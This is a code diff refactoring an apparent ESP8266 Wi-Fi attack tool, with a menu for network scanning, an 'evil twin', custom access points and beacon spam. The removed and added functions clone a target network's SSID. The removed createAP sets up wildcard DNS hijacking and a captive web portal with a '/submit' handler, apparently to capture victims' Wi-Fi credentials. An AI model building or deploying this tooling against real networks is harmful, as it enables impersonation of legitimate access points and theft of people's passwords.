@@ -4,12 +4,6 @@
 #include "NetworkList.h"
 #include "Attacks.h"
 
-IPAddress local_IP(192,168,4,22);
-IPAddress subnet(255,255,255,0);
-
-ESP8266WebServer server(DEFAULT_PORT);
-DNSServer dnsServer;
-
 NetworkList networks;
 
 String custom_AP_SSID;
@@ -34,7 +28,6 @@ void setup() {
     delay(10);
 }
 
-
 void loop(){
     mainMenu();
     delay(10);
@@ -52,11 +45,10 @@ void mainMenu(){
                 findNewNetworks();
                 break;
             case 2:
-                evilTwin();
+                handleEvilTwin();
                 break;
             case 3:
-                createCustomAP();
-                attacking = true;
+                handleCustomAP();
                 break;
             case 4:
                 handleBeaconSpam();
@@ -78,61 +70,6 @@ void mainMenu(){
             server.handleClient();
         }
     }
-}
-
-void evilTwin(){
-    int8_t networkIndex = getNetworkIndex();
-    if(networkIndex != -1){
-        custom_AP_SSID = networks[networkIndex]->SSID;
-        attacking = createAP();
-    }else{
-      attacking = false;
-    }
-}
-
-void createCustomAP(){
-    Serial.print("Enter custom SSID: ");
-    View::getStrInput(custom_AP_SSID);
-    attacking = createAP();
-}
-
-bool createAP(){
-    Serial.print("Creating network: ");
-    Serial.println(custom_AP_SSID);
-    
-    if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
-        Serial.println("Failed to configure AP");
-        return false;
-    }
-    
-    if (!WiFi.softAP(custom_AP_SSID)) {
-        Serial.println("Failed to start AP");
-        return false;
-    }
-
-    if(!dnsServer.start(DNS_PORT, "*", local_IP)){
-        Serial.println("Failed to start DNS Server");
-        return false;
-    }
-
-    delay(500);
-
-    Serial.println("\nHTTP server started");
-    Serial.print("IP Address: ");
-    Serial.println(WiFi.softAPIP());
-
-    server.onNotFound([]() {
-        WebPortal::handleConnect();
-    });
-
-    server.on("/submit", []() {
-        WebPortal::handleSubmit();
-    });
-    //server.onNotFound(handleNotFound);
-    server.begin();
-    apStarted = true;
-    
-    return true;
 }
 
 int8_t getNetworkIndex(){
@@ -171,9 +108,22 @@ void findNewNetworks(){
         channel = WiFi.channel(i);
 
         networks.addNetwork(SSID, BSSIDstr, BSSID, RSSI, channel);
-   
     }
     networks.printNetworks();
+}
+
+void handleEvilTwin(){
+    int8_t networkIndex = getNetworkIndex();
+    if(networkIndex != -1){
+        custom_AP_SSID = networks[networkIndex]->SSID;
+        apStarted = createAP(custom_AP_SSID);
+    }
+}
+
+void handleCustomAP(){
+    Serial.print("Enter custom SSID: ");
+    View::getStrInput(custom_AP_SSID);
+    apStarted = createAP(custom_AP_SSID);
 }
 
 void handleBeaconSpam(){
